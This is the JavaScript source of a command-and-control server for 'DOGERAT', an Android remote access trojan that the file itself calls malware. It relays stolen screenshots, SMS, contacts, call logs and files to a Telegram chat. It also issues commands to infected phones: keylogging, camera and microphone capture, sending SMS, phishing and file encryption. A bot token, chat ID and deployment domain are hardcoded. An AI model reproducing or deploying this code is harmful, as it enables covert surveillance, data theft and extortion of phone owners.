// RAT C2 Server - Versión final limpia, estructurada y con la máxima compatibilidad de red.

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const multer = require('multer');

// ==================================================================
// 🚨 --- ZONA DE CONFIGURACIÓN MANUAL (HARDCODED) --- 🚨
// ==================================================================

// 1. PEGA TU TOKEN DE TELEGRAM AQUÍ
const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; 

// 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
const MANUAL_DOMAIN = "https://ratserver-production-96a6.up.railway.app"; 

// 3. PEGA TU ID DE CHAT DE TELEGRAM AQUÍ
const MANUAL_CHAT_ID = "6775348523";

// ==================================================================

// Validación de Credenciales
if (MANUAL_TOKEN.includes("PEGAR") || MANUAL_CHAT_ID.includes("PEGAR")) {
    console.error("❌ ERROR: Faltan credenciales en server.js");
    process.exit(1);
}

// Configuración de Directorios y Bot
const FILE_DIR = 'file';
if (!fs.existsSync(FILE_DIR)) try { fs.mkdirSync(FILE_DIR); } catch (e) {}

const bot = new TelegramBot(MANUAL_TOKEN.trim(), { polling: true });
console.log("[TELEGRAM] Bot inicializado correctamente.");

const app = express();
const server = http.createServer(app);

// 🔑 CONFIGURACIÓN DE CONEXIÓN CRÍTICA (CORS AGRESIVO)
// Acepta conexiones desde cualquier origen. Esto intenta forzar el paso a través del proxy.
const io = new Server(server, {
    cors: {
        origin: "*", 
        methods: ["GET", "POST"]
    }
}); 

app.use(express.json());
app.use(express.static('HTML'));

// --- ESTADO DEL SISTEMA (Basado en el original) ---
const connectedDevices = new Map(); // Mapa de dispositivos conectados (ID -> {socket, model, ...})
const currentActions = new Map();   // Mapa para rastrear acciones interactivas (chatId -> 'action_type')
const selectedDevice = new Map();   // Mapa para rastrear el dispositivo actualmente seleccionado (chatId -> deviceId)

// Configuración Multer
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, FILE_DIR),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ storage: storage });

// --- Rutas HTTP (Manejo de datos de la app) ---

// Manejo de carga de archivos (ej: screenshot, audio, logs)
app.post('/upload', upload.single('file'), (req, res) => {
    const deviceId = req.headers['currentTarget'];
    const device = connectedDevices.get(deviceId);
    
    if (device) {
        bot.sendDocument(MANUAL_CHAT_ID, req.file.buffer, {
            caption: `<b>✯ Archivo Recibido ✯</b>\nDe: ${device.model}\nArchivo: ${req.file.originalname}`,
            parse_mode: 'HTML'
        }, {
            filename: req.file.originalname,
            contentType: 'application/octet-stream'
        });
    }
    res.send('Done');
});

// Manejo de texto y logs (ej: contactos, historial de llamadas)
app.post('/text', (req, res) => {
    const deviceId = req.headers['currentTarget'];
    const device = connectedDevices.get(deviceId);
    const receivedText = req.body.text || 'No hay información';

    if (device) {
        bot.sendMessage(MANUAL_CHAT_ID, 
            `<b>✯ Mensaje Recibido ✯</b>\n\nDe: ${device.model}\n\n${receivedText}`, 
            { parse_mode: 'HTML' }
        );
    }
    res.send('Done');
});

// --- Lógica Socket.IO (Conexión Android) ---

io.on('connection', socket => {
    const h = socket.handshake.headers;
    // El código original usaba target, model, version, time, host
    const deviceId = h['currentTarget']; 
    const model = h['model'] || 'Unknown Model';

    if (deviceId && !connectedDevices.has(deviceId)) {
        connectedDevices.set(deviceId, {
            socket: socket,
            model: model,
            version: h['version'] || 'N/A',
            ip: h['host'] || 'N/A',
            id: deviceId
        });

        // Envío de mensaje de bienvenida al bot
        bot.sendMessage(MANUAL_CHAT_ID, 
            `<b>✯ Nuevo Dispositivo Conectado ✯</b>\n\n` +
            `Modelo: ${model}\n` +
            `IP: ${h['host'] || 'N/A'}\n` +
            `ID: ${deviceId}\n` +
            `Versión: ${h['version'] || 'N/A'}`, 
            { parse_mode: 'HTML' }
        );
    }

    // Evento de desconexión
    socket.on('disconnect', () => {
        if (connectedDevices.has(deviceId)) {
            const device = connectedDevices.get(deviceId);
            bot.sendMessage(MANUAL_CHAT_ID, 
                `<b>✯ Dispositivo Desconectado ✯</b>\nModelo: ${device.model}`, 
                { parse_mode: 'HTML' }
            );
            connectedDevices.delete(deviceId);
        }
    });

    // Evento para recibir comandos de respuesta o datos cortos
    socket.on('commend', data => {
        bot.sendMessage(MANUAL_CHAT_ID, `<b>Respuesta del Dispositivo:</b>\n${data}`, { parse_mode: 'HTML' });
    });
});

// --- Lógica del Bot de Telegram (Completa) ---

const commands = {
    // Comandos de Dispositivo
    'screenshot': 'screenshot',
    'microphone': 'microphone',
    'calls': 'calls',
    'sms': 'sms',
    'contacts': 'contacts',
    'vibrate': 'vibrate',
    'toast': 'toast',
    'clipboard': 'clipboard',
    'apps': 'apps',
    'fileExplorer': 'file-explorer',
    'mainCamera': 'main-camera',
    'selfieCamera': 'selfie-camera',
    'keyloggerOn': 'keylogger-on',
    'keyloggerOff': 'keylogger-off',
    'popNotification': 'popNotification',
    'openUrl': 'url',
    // ... otros comandos de la app original
};

const sendCommand = (chatId, deviceId, command, extras = []) => {
    const device = connectedDevices.get(deviceId);

    if (!device) {
        bot.sendMessage(chatId, '⚠️ Error: Dispositivo no encontrado o desconectado.');
        return false;
    }
    
    // Envía el comando como un objeto JSON, como espera la app
    device.socket.emit('commend', {
        request: command,
        extras: extras
    });

    bot.sendMessage(chatId, `Comando <b>${command}</b> enviado a ${device.model}.`, { parse_mode: 'HTML' });
    return true;
};

bot.on('message', async msg => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (!text || String(chatId) !== String(MANUAL_CHAT_ID)) return;

    const currentTargetId = selectedDevice.get(chatId);
    const currentAction = currentActions.get(chatId);
    
    // Función para manejar la vuelta al menú principal
    const returnToMainMenu = () => {
        currentActions.delete(chatId);
        selectedDevice.delete(chatId);
        bot.sendMessage(chatId, 
            `<b>✯ DOGERAT C2 ✯</b>\nDispositivos: ${connectedDevices.size}`, 
            {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯', '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯'], ['✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯']],
                    resize_keyboard: true
                }
            }
        );
    };

    if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯' || text === '✯ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 ✯') {
        return returnToMainMenu();
    }

    // --- MENÚS ---

    else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
         if (connectedDevices.size === 0) {
            return bot.sendMessage(chatId, 'No hay dispositivos conectados.');
        }
        let list = [];
        connectedDevices.forEach((v) => list.push([v.model]));
        list.push(['✯ All ✯']); // Opción para todos los dispositivos
        list.push(['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']);
        
        bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚊𝚌𝚝𝚒𝚘𝚗 ✯</b>', {
            parse_mode: 'HTML',
            reply_markup: { keyboard: list, resize_keyboard: true }
        });
    }

    else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
        const keyboard = [
            ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯', '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯'],
            ['✯ 𝙲𝚊𝚕𝚕𝚜 ✯', '✯ 𝚂𝙼𝚂 ✯', '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯', '✯ 𝙰𝚙𝚙𝚜 ✯'],
            ['✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯', '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯'],
            ['✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯', '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯'],
            ['✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯', '✯ 𝚃𝚘𝚊𝚜𝚝 ✯', '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯', '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯'],
            ['✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯', '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯'],
            ['✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯', '✯ 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 ✯'],
            ['✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯']
        ];
        bot.sendMessage(chatId, '<b>✯ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 ✯</b>', {
            parse_mode: 'HTML',
            reply_markup: { keyboard: keyboard, resize_keyboard: true }
        });
    }
    
    else if (text === '✯ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 ✯') {
        const aboutText = 
            `<b>DOGERAT 𝚒𝚜 𝚊 𝚖𝚊𝚕𝚠𝚊𝚛𝚎 𝚝𝚘 𝚌𝚘𝚗𝚝𝚛𝚘𝚕 𝙰𝚗𝚍𝚛𝚘𝚒𝚍 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n` +
            `𝙰𝚗𝚢 𝚖𝚒𝚜𝚞𝚜𝚎 𝚒𝚜 𝚝𝚑𝚎 𝚛𝚎𝚜𝚙𝚘𝚗𝚜𝚒𝚋𝚒𝚕𝚒𝚝𝚢 𝚘𝚏 𝚝𝚑𝚎 𝚙𝚎𝚛𝚜𝚘𝚗!\n\n` +
            `𝙳𝚎𝚟𝚎𝚕𝚘𝚙𝚎𝚍 𝚋𝚢: @CYBERSHIELDX\n` +
            `𝚃𝚎𝚕𝚎𝚐𝚛𝚊𝚖 → @CUBERSHIELDX\n` +
            `ADMIN → @SPHANTER`;
        bot.sendMessage(chatId, aboutText, { parse_mode: 'HTML' });
    }

    // --- SELECCIÓN DE DISPOSITIVO ---
    
    else if (text === '✯ All ✯' || connectedDevices.has(text)) {
        const targetId = (text === '✯ All ✯') ? 'all' : Array.from(connectedDevices.values()).find(d => d.model === text)?.id;
        if (targetId) {
            selectedDevice.set(chatId, targetId);
            bot.sendMessage(chatId, 
                `<b>Has seleccionado: ${text}</b>\nAhora ve a "Action" para enviar comandos.`, 
                { parse_mode: 'HTML' }
            );
        }
    }
    
    // --- MANEJO DE COMANDOS SIMPLES Y SOLICITUDES DE INPUT ---

    else if (currentTargetId) {
        const device = connectedDevices.get(currentTargetId);
        
        // --- 1. SOLICITUDES DE INPUT (Paso 1: Pedir información) ---

        if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
            currentActions.set(chatId, 'await_mic_duration');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 ✯') {
            currentActions.set(chatId, 'await_vibrate_duration');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝚃𝚘𝚊𝚜𝚝 ✯') {
            currentActions.set(chatId, 'await_toast_msg');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 ✯') {
            currentActions.set(chatId, 'await_sms_number');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 ✯') {
            currentActions.set(chatId, 'await_notification_msg');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 ✯') {
            currentActions.set(chatId, 'await_url');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚄𝚁𝙻 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚘𝚙𝚎𝚗</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 ✯') {
            currentActions.set(chatId, 'await_encrypt');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚎𝚡𝚝𝚎𝚗𝚜𝚒𝚘𝚗 𝚝𝚘 𝚎𝚗𝚌𝚛𝚢𝚙𝚝 (ej: jpg)</b>\x0a\x0a', { parse_mode: 'HTML' });
        }
        else if (text === '✯ 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 ✯') {
            currentActions.set(chatId, 'await_decrypt');
            bot.sendMessage(chatId, '<b>✯ 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚎𝚡𝚝𝚎𝚗𝚜𝚒𝚘𝚗 𝚝𝚘 𝚍𝚎𝚌𝚛𝚢𝚙𝚝 (ej: jpg)</b>\x0a\x0a', { parse_mode: 'HTML' });
        }

        // --- 2. MANEJO DE INPUT (Paso 2: Ejecutar comando con el valor) ---

        else if (currentAction === 'await_mic_duration' && !isNaN(text)) {
            sendCommand(chatId, currentTargetId, commands.microphone, [{ key: 'duration', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_vibrate_duration' && !isNaN(text)) {
            sendCommand(chatId, currentTargetId, commands.vibrate, [{ key: 'duration', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_toast_msg') {
            sendCommand(chatId, currentTargetId, commands.toast, [{ key: 'toastText', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_notification_msg') {
            sendCommand(chatId, currentTargetId, commands.popNotification, [{ key: 'notificationText', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_url') {
            sendCommand(chatId, currentTargetId, commands.openUrl, [{ key: 'url', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_encrypt') {
            sendCommand(chatId, currentTargetId, 'encrypt', [{ key: 'fileExtension', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_decrypt') {
            sendCommand(chatId, currentTargetId, 'decrypt', [{ key: 'fileExtension', value: text }]);
            currentActions.delete(chatId);
        }
        else if (currentAction === 'await_sms_number') {
            // Guarda el número y pide el mensaje
            currentActions.set(chatId, 'await_sms_text');
            currentActions.set(`smsNumber:${chatId}`, text); 
            bot.sendMessage(chatId, `<b>✯ 𝙽𝚘𝚠 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 ${text}</b>\x0a\x0a`, { parse_mode: 'HTML' });
        }
        else if (currentAction === 'await_sms_text') {
            const number = currentActions.get(`smsNumber:${chatId}`);
            sendCommand(chatId, currentTargetId, 'sendSms', [
                { key: 'smsNumber', value: number },
                { key: 'smsText', value: text }
            ]);
            currentActions.delete(chatId);
            currentActions.delete(`smsNumber:${chatId}`);
        }
        
        // --- 3. COMANDOS INSTANTÁNEOS ---

        else {
            switch (text) {
                case '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯': sendCommand(chatId, currentTargetId, commands.screenshot); break;
                case '✯ 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 ✯': sendCommand(chatId, currentTargetId, commands.clipboard); break;
                case '✯ 𝙲𝚊𝚕𝚕𝚜 ✯': sendCommand(chatId, currentTargetId, commands.calls); break;
                case '✯ 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 ✯': sendCommand(chatId, currentTargetId, commands.contacts); break;
                case '✯ 𝙰𝚙𝚙𝚜 ✯': sendCommand(chatId, currentTargetId, commands.apps); break;
                case '✯ 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 ✯': sendCommand(chatId, currentTargetId, commands.fileExplorer); break;
                case '✯ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 ✯': sendCommand(chatId, currentTargetId, 'gallery'); break;
                case '✯ 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 ✯': sendCommand(chatId, currentTargetId, commands.mainCamera); break;
                case '✯ 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 ✯': sendCommand(chatId, currentTargetId, commands.selfieCamera); break;
                case '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 ✯': sendCommand(chatId, currentTargetId, commands.keyloggerOn); break;
                case '✯ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 ✯': sendCommand(chatId, currentTargetId, commands.keyloggerOff); break;
                
                default:
                    if (!currentAction) {
                        bot.sendMessage(chatId, `Comando no reconocido o acción inválida.`, { parse_mode: 'HTML' });
                    }
                    break;
            }
        }
    }
});

// ----------------------------------------------------

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`[EXPRESS] Servidor escuchando en puerto ${PORT}`));
